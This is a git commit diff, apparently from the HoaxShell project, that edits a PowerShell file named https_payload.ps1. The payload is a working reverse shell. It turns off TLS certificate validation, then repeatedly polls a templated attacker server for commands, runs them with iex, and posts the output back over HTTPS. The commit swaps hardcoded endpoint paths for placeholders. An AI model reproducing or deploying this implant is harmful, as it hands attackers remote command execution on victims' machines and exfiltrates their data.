a8dc0025e68baa368cb3c933178a1ed2966273f6
Panagiotis Chartas <t3l3machus@protonmail.com>
2022-07-12 00:54:14 +0200

    Update https_payload.ps1

--- https_payload.ps1
+++ https_payload.ps1
@@ -4,4 +4,4 @@ public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidati
 ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
-$s='*SERVERIP*';$i='*SESSIONID*';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/4db6390f840c -Headers @{"X-hoax-id"=$i};while ($true){$c=Invoke-WebRequest -UseBasicParsing -Uri $p$s/c5233a465a7d -Headers @{"X-hoax-id"=$i};if ($c.Content -ne 'None') {$r=iex $c.Content -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/7f47fd7ae404 -Method POST -Headers @{"X-hoax-id"=$i} -Body $r$e} sleep *FREQ*}
+$s='*SERVERIP*';$i='*SESSIONID*';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/*VERIFY* -Headers @{"X-hoax-id"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"X-hoax-id"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/*POSTRES* -Method POST -Headers @{"X-hoax-id"=$i} -Body $r$e} sleep *FREQ*}
